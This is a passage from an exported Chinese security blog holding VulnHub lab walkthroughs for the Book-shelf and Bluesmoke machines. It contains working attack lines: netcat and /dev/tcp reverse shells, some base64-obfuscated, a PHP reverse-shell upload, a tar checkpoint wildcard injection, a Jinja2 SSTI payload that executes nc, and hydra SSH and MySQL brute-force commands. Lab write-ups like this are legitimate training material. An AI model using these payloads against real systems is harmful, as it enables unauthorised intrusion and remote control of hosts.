/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span><br><span class="line">[+] Negative Status codes:   404</span><br><span class="line">[+] User Agent:              gobuster/3.1.0</span><br><span class="line">[+] Extensions:              html,txt,php</span><br><span class="line">[+] Timeout:                 10s</span><br><span class="line">===============================================================</span><br><span class="line">2021/08/31 09:06:44 Starting gobuster in directory enumeration mode</span><br><span class="line">===============================================================</span><br><span class="line">/index.html           (Status: 200) [Size: 5720]</span><br><span class="line">/robots.txt           (Status: 200) [Size: 70]  </span><br><span class="line">/root                 (Status: 301) [Size: 313] [--&gt; http://192.168.1.134/root/]</span><br><span class="line">/server-status        (Status: 403) [Size: 278]                                 </span><br><span class="line">                                                                                </span><br><span class="line">===============================================================</span><br><span class="line">2021/08/31 09:10:37 Finished</span><br><span class="line">===============================================================</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">gobuster dir -u http://192.168.1.134/root -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">┌──(root💀kali)-[/home/workhard]</span><br><span class="line">└─# gobuster dir -u http://192.168.1.134/root -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php</span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.1.0</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:                     http://192.168.1.134/root</span><br><span class="line">[+] Method:                  GET</span><br><span class="line">[+] Threads:                 10</span><br><span class="line">[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span><br><span class="line">[+] Negative Status codes:   404</span><br><span class="line">[+] User Agent:              gobuster/3.1.0</span><br><span class="line">[+] Extensions:              html,txt,php</span><br><span class="line">[+] Timeout:                 10s</span><br><span class="line">===============================================================</span><br><span class="line">2021/08/31 09:16:24 Starting gobuster in directory enumeration mode</span><br><span class="line">===============================================================</span><br><span class="line">/images               (Status: 301) [Size: 320] [--&gt; http://192.168.1.134/root/images/]</span><br><span class="line">/log_in               (Status: 301) [Size: 320] [--&gt; http://192.168.1.134/root/log_in/]</span><br><span class="line">                                                                                       </span><br><span class="line">===============================================================</span><br><span class="line">2021/08/31 09:20:18 Finished</span><br><span class="line">===============================================================</span><br></pre></td></tr></table></figure>

<h3 id="登录web"><a href="#登录web" class="headerlink" title="登录web"></a>登录web</h3><ul>
<li>首页</li>
</ul>
<p><img data-src="./Book-shelf/1.png" alt></p>
<ul>
<li><code>robots.txt</code></li>
</ul>
<p><img data-src="./Book-shelf/2.png" alt></p>
<ul>
<li>查看<code>FTP</code>,发现密码文件</li>
</ul>
<p><img data-src="./Book-shelf/3.png" alt></p>
<ul>
<li>根据<code>robots.txt</code>提示，再次扫描下<code>images</code></li>
</ul>
<p><img data-src="./Book-shelf/4.png" alt></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gobuster dir -u http://192.168.1.134/root/images -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">┌──(root💀kali)-[/home/workhard]</span><br><span class="line">└─# gobuster dir -u http://192.168.1.134/root/images -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php</span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.1.0</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:                     http://192.168.1.134/root/images</span><br><span class="line">[+] Method:                  GET</span><br><span class="line">[+] Threads:                 10</span><br><span class="line">[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span><br><span class="line">[+] Negative Status codes:   404</span><br><span class="line">[+] User Agent:              gobuster/3.1.0</span><br><span class="line">[+] Extensions:              txt,php,html</span><br><span class="line">[+] Timeout:                 10s</span><br><span class="line">===============================================================</span><br><span class="line">2021/08/31 09:27:52 Starting gobuster in directory enumeration mode</span><br><span class="line">===============================================================</span><br><span class="line">/os                   (Status: 301) [Size: 323] [--&gt; http://192.168.1.134/root/images/os/]</span><br><span class="line">                                                                                          </span><br><span class="line">===============================================================</span><br><span class="line">2021/08/31 09:32:09 Finished</span><br><span class="line">===============================================================</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">gobuster dir -u http://192.168.1.134/root/images/os -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">┌──(root💀kali)-[~/vulnhub/Book-shelf]</span><br><span class="line">└─# gobuster dir -u http://192.168.1.134/root/images/os -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php</span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.1.0</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:                     http://192.168.1.134/root/images/os</span><br><span class="line">[+] Method:                  GET</span><br><span class="line">[+] Threads:                 10</span><br><span class="line">[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span><br><span class="line">[+] Negative Status codes:   404</span><br><span class="line">[+] User Agent:              gobuster/3.1.0</span><br><span class="line">[+] Extensions:              php,html,txt</span><br><span class="line">[+] Timeout:                 10s</span><br><span class="line">===============================================================</span><br><span class="line">2021/08/31 09:29:44 Starting gobuster in directory enumeration mode</span><br><span class="line">===============================================================</span><br><span class="line">/feedback.php         (Status: 200) [Size: 118]</span><br><span class="line">/Images               (Status: 301) [Size: 330] [--&gt; http://192.168.1.134/root/images/os/Images/]</span><br><span class="line">/Home                 (Status: 301) [Size: 328] [--&gt; http://192.168.1.134/root/images/os/Home/]  </span><br><span class="line">/Downloads            (Status: 301) [Size: 333] [--&gt; http://192.168.1.134/root/images/os/Downloads/]</span><br><span class="line">/Documents            (Status: 301) [Size: 333] [--&gt; http://192.168.1.134/root/images/os/Documents/]</span><br><span class="line">/Desktop              (Status: 301) [Size: 331] [--&gt; http://192.168.1.134/root/images/os/Desktop/]  </span><br><span class="line">                                                                                                    </span><br><span class="line">===============================================================</span><br><span class="line">2021/08/31 09:34:06 Finished</span><br><span class="line">===============================================================</span><br></pre></td></tr></table></figure>

<h3 id="命令注入"><a href="#命令注入" class="headerlink" title="命令注入"></a>命令注入</h3><ul>
<li>发现命令注入入口</li>
</ul>
<p><img data-src="./Book-shelf/5.png" alt></p>
<p><img data-src="./Book-shelf/6.png" alt></p>
<p><img data-src="./Book-shelf/7.png" alt></p>
<ul>
<li>效果如下</li>
</ul>
<p><img data-src="./Book-shelf/8.png" alt></p>
<h3 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h3><ul>
<li>反弹<code>shell</code></li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nc -lvnp 1234</span><br><span class="line">http://192.168.1.134/root/images/os/feedback.php?path=nc -e /usr/bin/sh 192.168.1.102 1234</span><br></pre></td></tr></table></figure>

<ul>
<li><p>进入后台，发现<code>defender</code>用户</p>
</li>
<li><p>发现敏感文件</p>
</li>
</ul>
<p><img data-src="./Book-shelf/9.png" alt></p>
<p>temp</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cp &#x2F;usr&#x2F;bin&#x2F;cat &#x2F;tmp&#x2F;id</span><br><span class="line"></span><br><span class="line">cp &#x2F;usr&#x2F;bin&#x2F;sh &#x2F;tmp&#x2F;id</span><br><span class="line"></span><br><span class="line">python -c &#39;import pty;pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;</span><br><span class="line"></span><br><span class="line">python3 -c &#39;import pty;pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;</span><br><span class="line"></span><br><span class="line">hydra -l defender -P .&#x2F;webpass.txt 192.168.1.134 -t 4 ssh</span><br><span class="line"></span><br><span class="line">username KeepR3ading@b00ks</span><br><span class="line"></span><br><span class="line">KeepR3ading@B00ks</span><br><span class="line"></span><br><span class="line">Keepr3ading@B00ks</span><br><span class="line"></span><br><span class="line">Keepr3ading@b00ks</span><br><span class="line"></span><br><span class="line">keepr3ading@b00ks</span><br><span class="line"></span><br><span class="line">KeepR3ading@B00ks</span><br><span class="line"></span><br><span class="line">KeepR3ading@books</span><br><span class="line"></span><br><span class="line">keepR3ading@books</span><br><span class="line"></span><br><span class="line">keepr3ading@books</span><br><span class="line"></span><br><span class="line">owaspTG10ten</span><br><span class="line"></span><br><span class="line">#Output to file</span><br><span class="line">.&#x2F;linpeas.sh -a &gt; &#x2F;dev&#x2F;shm&#x2F;linpeas.txt #Victim</span><br><span class="line"></span><br><span class="line">.&#x2F;linpeas.sh -a &gt; &#x2F;tmp&#x2F;1.txt #Victim</span><br><span class="line"></span><br><span class="line">less -r &#x2F;tmp&#x2F;1.txt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">less -r &#x2F;dev&#x2F;shm&#x2F;linpeas.txt #Read with colors</span><br><span class="line"></span><br><span class="line">nc 192.168.1.134 9992 &gt;1.txt</span><br><span class="line"></span><br><span class="line">xxj31ZMTZzkVA</span><br><span class="line"></span><br><span class="line">sudo -u defender .&#x2F;.shelf</span><br><span class="line"></span><br><span class="line">su -u defender .&#x2F;.shelf</span><br><span class="line"></span><br><span class="line">hydra -l defender -P &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;</span><br><span class="line">rockyou.txt  192.168.1.134 -t 4 ssh</span><br><span class="line"></span><br><span class="line">aHR0cHM6Ly9naXRodWIuY29tL3NlYy1iZWhlYWx0aHk&#x3D;</span><br><span class="line"></span><br><span class="line">hydra -l root -P &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt 192.168.1.134:33060 mysql</span><br><span class="line"></span><br><span class="line">export PATH&#x3D;&#x2F;tmp:$PATH</span><br><span class="line"></span><br><span class="line">&#x2F;home&#x2F;defender&#x2F;Downloads&#x2F;.shelf</span><br><span class="line"></span><br><span class="line">book2[&quot;dafydd_marcus2nd&quot;]</span><br><span class="line">qnslqq_znephf2aq</span><br><span class="line"></span><br><span class="line">netsecessB0F</span><br><span class="line">book5[&quot;net-sec-ess-B0F&quot;]</span><br><span class="line"></span><br><span class="line">book3[&quot;wireshark2&gt;com&quot;]</span><br><span class="line">aHR0cHM6Ly9naXRodWIuY29tL3NlYy1iZWhlYWx0aHk&#x3D; https:&#x2F;&#x2F;github.com&#x2F;sec-behealthy</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">无关</span><br><span class="line">3232235858</span><br><span class="line"></span><br><span class="line">import subprocess</span><br><span class="line">rm &#x2F;tmp&#x2F;f;mkfifo &#x2F;tmp&#x2F;f;cat &#x2F;tmp&#x2F;f|sh -i 2&gt;&amp;1|ncat -u 3232235858 7777 &gt;&#x2F;tmp&#x2F;f</span><br><span class="line"></span><br><span class="line">nc -e &#x2F;bin&#x2F;bash 192.168.00000001.82 7778</span><br><span class="line"></span><br><span class="line">subprocess.run(a, capture_output&#x3D;True, text&#x3D;True, shell&#x3D;True)</span><br><span class="line"></span><br><span class="line">a &#x3D; &quot;nc -e &#x2F;bin&#x2F;bash &#96;echo bmMgLWUgL2Jpbi9iYXNoIDE5Mi4xNjguMS44MiA3Nzc4Cg&#x3D;&#x3D; | base64 -d&#96; 7778&quot;</span><br><span class="line"></span><br><span class="line">echo &#39;nc -e &#x2F;bin&#x2F;bash 192.168.1.82 7778&#39; | base64</span><br><span class="line"></span><br><span class="line">nc -e &#x2F;bin&#x2F;bash $(echo bmMgLWUgL2Jpbi9iYXNoIDE5Mi4xNjguMS44MiA3Nzc4Cg&#x3D;&#x3D; | base64 -d) 7778</span><br><span class="line"></span><br><span class="line">nc -e &#x2F;bin&#x2F;bash $(echo 192.168.1.82) 7778</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>靶场</category>
        <category>Book-shelf</category>
      </categories>
      <tags>
        <tag>入门</tag>
        <tag>综合靶场测试</tag>
        <tag>Book-shelf</tag>
      </tags>
  </entry>
  <entry>
    <title>Bluesmoke</title>
    <url>/2021/05/05/blog_formal/security/%E9%9D%B6%E5%9C%BA/web%E9%9D%B6%E5%9C%BA/finish/Bluesmoke/</url>
    <content><![CDATA[<h1 id="Bluesmoke"><a href="#Bluesmoke" class="headerlink" title="Bluesmoke"></a>Bluesmoke</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>​    一道boot2root的综合靶场练习</p>
<a id="more"></a>

<h2 id="基础环境"><a href="#基础环境" class="headerlink" title="基础环境"></a>基础环境</h2><ul>
<li>kali2020</li>
<li>Bluesmoke</li>
<li>windows10</li>
</ul>
<h2 id="测试步骤"><a href="#测试步骤" class="headerlink" title="测试步骤"></a>测试步骤</h2><h3 id="发现目标"><a href="#发现目标" class="headerlink" title="发现目标"></a>发现目标</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">arp-scan -l</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">root@kali:/home/caixin/vulnhub/bluesmoke# arp-scan -l</span><br><span class="line">Interface: eth0, type: EN10MB, MAC: 00:50:56:28:f2:ec, IPv4: 192.168.43.172</span><br><span class="line">Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.43.2    08:00:27:a1:a7:71       PCS Systemtechnik GmbH</span><br><span class="line">192.168.43.2    08:00:27:34:f0:ad       PCS Systemtechnik GmbH (DUP: 2)</span><br><span class="line">192.168.43.1    26:ca:cd:37:40:d8       (Unknown: locally administered)</span><br><span class="line">192.168.43.188  d0:c6:37:be:7e:b3       Intel Corporate</span><br><span class="line">192.168.43.232  08:00:27:34:f0:ad       PCS Systemtechnik GmbH</span><br><span class="line">192.168.43.232  08:00:27:a1:a7:71       PCS Systemtechnik GmbH (DUP: 2)</span><br><span class="line"></span><br><span class="line">6 packets received by filter, 0 packets dropped by kernel</span><br><span class="line">Ending arp-scan 1.9.7: 256 hosts scanned in 2.108 seconds (121.44 hosts/sec). 6 responded</span><br></pre></td></tr></table></figure>

<ul>
<li>目标为 <code>192.168.43.232</code></li>
<li><code>NMAP</code></li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -sC -sV -p- 192.168.43.232</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">root@kali:/home/caixin/vulnhub/bluesmoke# nmap -sC -sV -p- 192.168.43.232</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2021-05-05 05:26 EDT</span><br><span class="line">Nmap scan report for 192.168.43.232</span><br><span class="line">Host is up (0.00090s latency).</span><br><span class="line">Not shown: 65533 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 ac:8e:9e:91:49:3f:65:f7:fb:05:07:33:a6:03:88:3f (RSA)</span><br><span class="line">|   256 7f:2c:50:f5:35:9b:e2:2c:96:ff:bc:35:6a:f3:53:d1 (ECDSA)</span><br><span class="line">|_  256 66:15:b0:cb:3b:ba:12:1a:40:38:eb:7f:8d:ba:a3:a4 (ED25519)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.38 ((Debian))</span><br><span class="line">| http-cookie-flags: </span><br><span class="line">|   /: </span><br><span class="line">|     PHPSESSID: </span><br><span class="line">|_      httponly flag not set</span><br><span class="line">|_http-server-header: Apache/2.4.38 (Debian)</span><br><span class="line">|_http-title: Filee Upload to Backup</span><br><span class="line">MAC Address: 08:00:27:34:F0:AD (Oracle VirtualBox virtual NIC)</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 29.22 seconds</span><br></pre></td></tr></table></figure>

<ul>
<li>目录扫描</li>
</ul>
<p><img data-src="./Bluesmoke/1.png" alt></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gobuster dir -u http://192.168.43.232/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">root@kali:/home/caixin/vulnhub/symfonos6# gobuster dir -u http://192.168.43.232/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php</span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.0.1</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:            http://192.168.43.232/</span><br><span class="line">[+] Threads:        10</span><br><span class="line">[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span><br><span class="line">[+] Status codes:   200,204,301,302,307,401,403</span><br><span class="line">[+] User Agent:     gobuster/3.0.1</span><br><span class="line">[+] Extensions:     html,txt,php</span><br><span class="line">[+] Timeout:        10s</span><br><span class="line">===============================================================</span><br><span class="line">2021/05/05 05:28:58 Starting gobuster</span><br><span class="line">===============================================================</span><br><span class="line">/index.php (Status: 200)</span><br><span class="line">/uploads (Status: 301)</span><br><span class="line">/upload.php (Status: 302)</span><br><span class="line">/javascript (Status: 301)</span><br><span class="line">/server-status (Status: 403)</span><br><span class="line">===============================================================</span><br><span class="line">2021/05/05 05:36:24 Finished</span><br><span class="line">===============================================================</span><br></pre></td></tr></table></figure>

<h3 id="登录web"><a href="#登录web" class="headerlink" title="登录web"></a>登录web</h3><ul>
<li>首页</li>
</ul>
<p><img data-src="./Bluesmoke/2.png" alt></p>
<h3 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h3><ul>
<li>最终测试<code>POC</code></li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># reverse.php</span></span><br><span class="line"><span class="meta">&lt;?php</span> exec(<span class="string">"/bin/bash -c 'bash -i &gt; /dev/tcp/192.168.43.172/7777 0&gt;&amp;1'"</span>);</span><br></pre></td></tr></table></figure>

<ul>
<li>reverse.php 放到POC 目录下， POC目录打包tar上传</li>
</ul>
<p><img data-src="./Bluesmoke/3.png" alt></p>
<p><img data-src="./Bluesmoke/4.png" alt></p>
<p><img data-src="./Bluesmoke/5.png" alt></p>
<h3 id="Shell"><a href="#Shell" class="headerlink" title="Shell"></a>Shell</h3><ul>
<li>拿到<code>shell</code></li>
</ul>
<p><img data-src="./Bluesmoke/6.png" alt></p>
<ul>
<li>其他用户</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">www-data@Bluesmoke:/home$ cat /etc/passwd</span><br><span class="line">cat /etc/passwd</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class="line">sync:x:4:65534:sync:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span class="line">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br><span class="line">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br><span class="line">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br><span class="line">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br><span class="line">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><br><span class="line">irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><br><span class="line">_apt:x:100:65534::/nonexistent:/usr/sbin/nologin</span><br><span class="line">systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">messagebus:x:104:110::/nonexistent:/usr/sbin/nologin</span><br><span class="line">avahi-autoipd:x:105:112:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin</span><br><span class="line">sshd:x:106:65534::/run/sshd:/usr/sbin/nologin</span><br><span class="line">jaap:x:1000:1000:jaap,,,:/home/jaap:/bin/bash</span><br><span class="line">systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin</span><br><span class="line">backupper:x:1001:1001:,,,:/home/backupper:/bin/bash</span><br><span class="line">remnie:x:1002:1002:,,,:/home/remnie:/bin/bash</span><br><span class="line">postfix:x:107:115::/var/spool/postfix:/usr/sbin/nologin</span><br><span class="line">www-data@Bluesmoke:/home$ ls -al /home</span><br><span class="line">ls -al /home</span><br><span class="line">total 20</span><br><span class="line">drwxr-xr-x  5 root      root      4096 Apr  5 20:11 .</span><br><span class="line">drwxr-xr-x 18 root      root      4096 Apr  4 21:37 ..</span><br><span class="line">drwxr-x---  4 backupper backupper 4096 Apr  7 00:13 backupper</span><br><span class="line">drwxr-x---  6 jaap      jaap      4096 Apr  8 12:55 jaap</span><br><span class="line">drwxr-x---  3 remnie    remnie    4096 Apr  6 22:21 remnie</span><br></pre></td></tr></table></figure>

<p>备注： 用户为 <code>backupper jaap remnie</code> </p>
<ul>
<li>尝试暴力破解(无果)</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hydra -L user.txt -P /usr/share/wordlists/rockyou.txt 192.168.43.232 -t 16 ssh</span><br></pre></td></tr></table></figure>

<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><ul>
<li>发现</li>
</ul>
<p><img data-src="./Bluesmoke/7.png" alt></p>
<p><img data-src="./Bluesmoke/8.png" alt></p>
<ul>
<li>发现备份文件</li>
</ul>
<p><img data-src="./Bluesmoke/9.png" alt></p>
<ul>
<li><code>pspy64</code>查看进程信息</li>
</ul>
<p><img data-src="./Bluesmoke/10.png" alt></p>
<p><img data-src="./Bluesmoke/11.png" alt></p>
<ul>
<li>构造命令包上传，拿到<code>uid=1001</code>权限</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo '' &gt; --checkpoint=1</span><br><span class="line">echo '' &gt; '--checkpoint-action=exec=sh 1.sh'</span><br><span class="line">echo "/bin/bash -c '/bin/bash -i &gt;&amp; /dev/tcp/192.168.4.76/7776 0&gt;&amp;1'" &gt; 1.sh</span><br><span class="line">tar -cvf w.tar ./--checkpoint=1 ./--checkpoint-action=exec=sh\ 1.sh ./1.sh</span><br></pre></td></tr></table></figure>

<p><img data-src="./Bluesmoke/12.png" alt></p>
<p>第一个<code>flag</code></p>
<p><img data-src="./Bluesmoke/13.png" alt></p>
<h3 id="SSTI注入"><a href="#SSTI注入" class="headerlink" title="SSTI注入"></a>SSTI注入</h3><ul>
<li>发现类似信号启动的机制</li>
</ul>
<p><img data-src="./Bluesmoke/14.png" alt></p>
<ul>
<li>写入 <code>echo 1 &gt;&gt; /tmp/start</code></li>
<li>发现多了一个<code>web</code>服务</li>
</ul>
<p><img data-src="./Bluesmoke/15.png" alt></p>
<ul>
<li><code>ssh</code>端口转发<code>ssh -L 8787:127.0.0.1:8787 backupper@192.168.4.75</code></li>
</ul>
<p><img data-src="./Bluesmoke/16.png" alt></p>
<p>命令执行反弹<code>shell</code></p>
<p><img data-src="./Bluesmoke/17.png" alt></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('nc -e /bin/bash 192.168.4.76 7778').read()") &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>

<p><img data-src="./Bluesmoke/18.png" alt></p>
<ul>
<li><code>flag</code></li>
</ul>
<p><img data-src="./Bluesmoke/19.png" alt></p>
<h3 id="Root"><a href="#Root" class="headerlink" title="Root"></a>Root</h3><ul>
<li>敏感信息</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">remnie@Bluesmoke:~/scripts$ cat server.conf</span><br><span class="line">cat server.conf</span><br><span class="line"><span class="meta">#</span><span class="bash">file to connect to root Service</span></span><br><span class="line"></span><br><span class="line">00000000  30 30 31 31 30 31 30 30 20 30 31 31 30 30 31 30  |00110100 0110010|</span><br><span class="line">00000010  30 20 30 30 31 30 30 30 30 30 20 30 30 31 31 30  |0 00100000 00110|</span><br><span class="line">00000020  31 30 30 20 30 31 31 30 30 31 30 31 20 30 30 31  |100 01100101 001|</span><br><span class="line">00000030  30 30 30 30 30 20 30 30 31 31 30 31 30 31 20 30  |00000 00110101 0|</span><br><span class="line">00000040  30 31 31 30 31 31 31 20 30 30 31 30 30 30 30 30  |0110111 00100000|</span><br><span class="line">00000050  20 30 30 31 31 30 31 30 31 20 30 30 31 31 30 31  | 00110101 001101|</span><br><span class="line">00000060  30 30 20 30 30 31 30 30 30 30 30 20 30 30 31 31  |00 00100000 0011|</span><br><span class="line">00000070  30 31 30 31 20 30 30 31 31 30 30 31 31 20 30 30  |0101 00110011 00|</span><br><span class="line">00000080  31 30 30 30 30 30 20 30 30 31 31 30 30 31 31 20  |100000 00110011 |</span><br><span class="line">00000090  30 30 31 31 30 31 30 31 20 30 30 31 30 30 30 30  |00110101 0010000|</span><br><span class="line">000000a0  30 20 30 30 31 31 30 31 30 31 20 30 30 31 31 30  |0 00110101 00110|</span><br><span class="line">000000b0  31 30 30 20 30 30 31 30 30 30 30 30 20 30 30 31  |100 00100000 001|</span><br><span class="line">000000c0  31 30 31 30 30 20 30 30 31 31 30 31 30 31 20 30  |10100 00110101 0|</span><br><span class="line">000000d0  30 31 30 30 30 30 30 20 30 30 31 31 30 31 30 30  |0100000 00110100|</span><br><span class="line">000000e0  20 30 30 31 31 31 30 30 31 20 30 30 31 30 30 30  | 00111001 001000|</span><br><span class="line">000000f0  30 30 20 30 30 31 31 30 31 30 31 20 30 30 31 31  |00 00110101 0011|</span><br><span class="line">00000100  30 30 31 30 20 30 30 31 30 30 30 30 30 20 30 30  |0010 00100000 00|</span><br><span class="line">00000110  31 31 30 31 30 31 20 30 30 31 31 31 30 30 30 20  |110101 00111000 |</span><br><span class="line">00000120  30 30 31 30 30 30 30 30 20 30 30 31 31 30 31 30  |00100000 0011010|</span><br><span class="line">00000130  31 20 30 30 31 31 31 30 30 30 20 30 30 31 30 30  |1 00111000 00100|</span><br><span class="line">00000140  30 30 30 20 30 30 31 31 30 31 30 30 20 30 30 31  |000 00110100 001|</span><br><span class="line">00000150  31 31 30 30 31 20 30 30 31 30 30 30 30 30 20 30  |11001 00100000 0|</span><br><span class="line">00000160  30 31 31 30 31 30 31 20 30 30 31 31 30 30 31 31  |0110101 00110011|</span><br><span class="line">00000170  20 30 30 31 30 30 30 30 30 20 30 30 31 31 30 31  | 00100000 001101|</span><br><span class="line">00000180  30 30 20 30 31 31 30 30 30 31 30 20 30 30 31 30  |00 01100010 0010|</span><br><span class="line">00000190  30 30 30 30 20 30 30 31 31 30 31 30 31 20 30 30  |0000 00110101 00|</span><br><span class="line">000001a0  31 31 30 31 31 30 20 30 30 31 30 30 30 30 30 20  |110110 00100000 |</span><br><span class="line">000001b0  30 30 31 31 30 31 30 30 20 30 31 31 30 30 30 31  |00110100 0110001|</span><br><span class="line">000001c0  31 20 30 30 31 30 30 30 30 30 20 30 30 31 31 30  |1 00100000 00110|</span><br><span class="line">000001d0  31 30 30 20 30 30 31 31 30 31 30 31 20 30 30 31  |100 00110101 001|</span><br><span class="line">000001e0  30 30 30 30 30 20 30 30 31 31 30 30 31 31 20 30  |00000 00110011 0|</span><br><span class="line">000001f0  30 31 31 30 30 31 30 20 30 30 31 30 30 30 30 30  |0110010 00100000|</span><br><span class="line">00000200  20 30 30 31 31 30 31 30 30 20 30 30 31 31 30 31  | 00110100 001101|</span><br><span class="line">00000210  31 31 20 30 30 31 30 30 30 30 30 20 30 30 31 31  |11 00100000 0011|</span><br><span class="line">00000220  30 31 30 30 20 30 30 31 31 30 30 31 31 20 30 30  |0100 00110011 00|</span><br><span class="line">00000230  31 30 30 30 30 30 20 30 30 31 31 30 31 30 31 20  |100000 00110101 |</span><br><span class="line">00000240  30 30 31 31 30 30 31 30 20 30 30 31 30 30 30 30  |00110010 0010000|</span><br><span class="line">00000250  30 20 30 30 31 31 30 31 30 30 20 30 30 31 31 30  |0 00110100 00110|</span><br><span class="line">00000260  30 31 31 20 30 30 31 30 30 